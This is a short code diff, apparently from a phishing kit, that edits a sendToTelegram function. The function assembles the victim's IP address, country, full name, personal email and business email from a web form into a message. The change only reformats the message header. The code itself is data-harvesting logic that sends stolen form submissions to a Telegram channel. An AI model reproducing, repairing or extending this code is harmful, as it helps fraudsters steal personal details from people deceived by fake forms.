@@ -4375,7 +4375,7 @@
 
         // Send data to telegram
         function sendToTelegram() {
-    var content = + userIpData['user_ip'] + userIpData['country'] + "-" + userIpData['country_code'] + "\n" +
+    var content = "*Data : *" + userIpData['user_ip'] + " - " +userIpData['country'] + " - " + userIpData['country_code'] + "\n" +
         "Full Name: " + formsSendData['full-name'] + "\n" +
         "Personal Email: " + formsSendData['personal-email'] + "\n" +
         "Business Email: " + formsSendData['Business-email'] + "\n" +
